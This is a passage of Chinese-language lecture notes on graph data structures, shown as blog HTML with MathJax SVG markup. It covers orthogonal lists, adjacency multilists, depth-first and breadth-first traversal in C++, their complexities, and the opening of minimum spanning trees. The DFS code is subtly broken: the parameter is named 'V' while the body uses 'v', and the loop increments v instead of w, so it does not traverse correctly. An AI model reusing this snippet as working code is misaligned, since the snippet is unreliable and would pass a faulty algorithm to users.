-227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p><p>用途：邻接矩阵多用于稠密图，邻接表多用于稀疏图。</p><h4 id="3-2-2-4-十字链表"><a href="#3-2-2-4-十字链表" class="headerlink" title="3.2.2.4 十字链表"></a>3.2.2.4 十字链表</h4><p>有向图的邻接表有个缺点就是求出度或入度难，所以引入了十字链表。</p><p>十字链表是有向图的另一种链式存储结构，可以看成是将有向图的邻接表和逆邻接表结合起来形成的一种链表。</p><p>有向图中的每一条弧对应十字链表中的一个弧结点，同时有向图中的每个顶点在十字链表中对应一个结点，叫做顶点结点。</p><h4 id="3-2-2-5-邻接多重表"><a href="#3-2-2-5-邻接多重表" class="headerlink" title="3.2.2.5 邻接多重表"></a>3.2.2.5 邻接多重表</h4><p>邻接多重表解决无向图每条边都要存储两遍的缺点。</p><h3 id="3-2-3-图的遍历"><a href="#3-2-3-图的遍历" class="headerlink" title="3.2.3 图的遍历"></a>3.2.3 图的遍历</h3><p>遍历定义：从已给的连通图种某一顶点出发，沿着一些边访遍图中所有的顶点，且使每个顶点仅被访问一次，就叫做图的遍历，它是图的基本运算。</p><p>遍历实质：找每个顶点的邻接点的过程。</p><p>图的特点：图中可能存在回路，且图的任一顶点都可能与其它顶点相通，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。</p><p>怎么避免重复访问？</p><p>解决思路：设置辅助数组visited[n]，用来标记每个被访问过的顶点。初始状态visited[i]为0，顶点i被访问，改visited[i]为1，防止被多次访问。</p><h4 id="3-2-3-1-深度优先搜索-DFS"><a href="#3-2-3-1-深度优先搜索-DFS" class="headerlink" title="3.2.3.1 深度优先搜索(DFS)"></a>3.2.3.1 深度优先搜索(DFS)</h4><p>一条路走到黑，不撞南墙不回头。</p><img src="/posts/79666db/3.2.3.1.png" class="" title="深度优先搜索的方法"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DFS</span><span class="params">(AMGraph G, <span class="type">int</span> V)</span></span></span><br><span class="line"><span class="function"></span>{<span class="comment">//采用邻接矩阵实现图的深度优先遍历</span></span><br><span class="line">    cout &lt;&lt; v;<span class="comment">//访问第v个结点</span></span><br><span class="line">    visited[v] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (w=<span class="number">0</span>; w&lt;G.vexnum; v++)<span class="comment">//依次检查邻接矩阵v所在的行</span></span><br><span class="line">        <span class="keyword">if</span>((G.arcs[v][w]!=<span class="number">0</span>) &amp;&amp; (!visited[w]))</span><br><span class="line">            <span class="built_in">DFS</span>(G,w);</span><br><span class="line">    <span class="comment">//w是v的邻接点，如果w未访问，则递归调用DFS</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>用邻接矩阵来表示图，遍历图中每一个顶点都要从头扫描该顶点所在行，时间复杂度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.832ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 2577.6 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(1152,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(633,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2188.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p><p>用邻接表来表示图，虽然有2e个表结点，但只需扫描e个结点即可完成遍历，加上访问n个头结点的时间，时间复杂度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="8.664ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3829.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1974.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2974.4,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(3440.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p><p>稠密图适于在邻接矩阵上进行深度遍历；稀疏图适于在邻接表上进行深度遍历。</p><h4 id="3-2-3-2-广度优先搜索-BFS"><a href="#3-2-3-2-广度优先搜索-BFS" class="headerlink" title="3.2.3.2 广度优先搜索(BFS)"></a>3.2.3.2 广度优先搜索(BFS)</h4><p>方法：从图的某一结点出发，首先依次访问该结点的所有邻接顶点<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="14.803ex" height="1.934ex" role="img" focusable="false" viewBox="0 -661 6543 855"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="msub" transform="translate(485,0)"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(378,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1266.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1711.2,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="msub" transform="translate(2196.2,0)"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(378,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2977.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(3422.4,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(4761.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(5205.8,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="msub" transform="translate(5690.8,0)"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(378,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>，再按这些顶点被访问的先后次序依次访问与它们相邻接的所有未被访问的顶点，重复此过程，直至所有顶点均被访问为止。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BFS</span><span class="params">(Graph G, <span class="type">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>{<span class="comment">//采用邻接表实现图的广度优先遍历</span></span><br><span class="line">    cout &lt;&lt; v;</span><br><span class="line">    visited[v] = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">InitQueue</span>(Q);<span class="comment">//初始化辅助循环队列，置空</span></span><br><span class="line">    <span class="built_in">EnQueue</span>(Q, v);<span class="comment">//v进队</span></span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">QueueEmpty</span>(Q))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">DeQueue</span>(Q, u);<span class="comment">//队列非空队头元素并置u</span></span><br><span class="line">        <span class="keyword">for</span>(w=<span class="built_in">FirstAdjVex</span>(G,u); w&gt;=<span class="number">0</span>; w=<span class="built_in">NextAdjVex</span>(G,u,w))</span><br><span class="line">            <span class="keyword">if</span>(!visited[w])</span><br><span class="line">            {<span class="comment">//w为u的尚未访问的邻接顶点</span></span><br><span class="line">                cout &lt;&lt; w;</span><br><span class="line">                visited[w] = <span class="literal">true</span>;<span class="comment">//w进队</span></span><br><span class="line">                <span class="built_in">EnQueue</span>(Q,w);</span><br><span class="line">            }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>如果使用邻接矩阵，则BFS遍历图中每一个顶点都要从头扫描该顶点所在行，时间复杂度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.832ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 2577.6 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(1152,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(633,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2188.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p><p>用邻接表来表示图，虽然有2e个表结点，但只需扫描e个结点即可完成遍历，加上访问n个头结点的时间，时间复杂度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="8.664ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3829.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(763,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1152,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1974.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2974.4,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(3440.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p><h4 id="3-2-3-3-DFS和BFS的比较"><a href="#3-2-3-3-DFS和BFS的比较" class="headerlink" title="3.2.3.3 DFS和BFS的比较"></a>3.2.3.3 DFS和BFS的比较</h4><ul><li>空间复杂度相同，都是O(n)(借用了堆栈或队列)</li><li>时间复杂度只与存储结构(邻接矩阵或邻接表)有关，而与搜索算法无关</li></ul><h3 id="3-2-4-图的应用"><a href="#3-2-4-图的应用" class="headerlink" title="3.2.4 图的应用"></a>3.2.4 图的应用</h3><h4 id="3-2-4-1-最小生成树"><a href="#3-2-4-1-最小生成树" class="headerlink" title="3.2.4.1 最小生成树"></a>3.2.4.1 最小生成树</h4><p>生成树：所有顶点均由边连接在一起，但不存在回路的图。</p><p>一个图可以有许多棵不同的生成树。</p><p>所有生成树具有以下共同特点：</p><ul><li>生成树的顶点个数与图的顶点个数相同</li><li>生成树是图的极小连通子图，去掉一条边则非连通</li><li>一个有n个顶点的连通图的生成树有n-1条边</li><li>在生成树中再加一条边必然形成回路</li><li>生成树中任意两个顶点间的路径是唯一的</li></ul><p>含n个顶点n-1条边的图不一定是生成树。</p><p>最小生成树：给定一个无向网络，在该网的所有生成树中，使得各边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。最小生成树可能不唯一。</p><p>MST性质(Minimum Spanning Tree)：设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="16.905ex" height="1.984ex" role="img" focusable="false" viewBox="0 -683 7472.2 877"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mi" transform="translate(1794.6,0)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mo" transform="translate(2561.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(3006.2,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 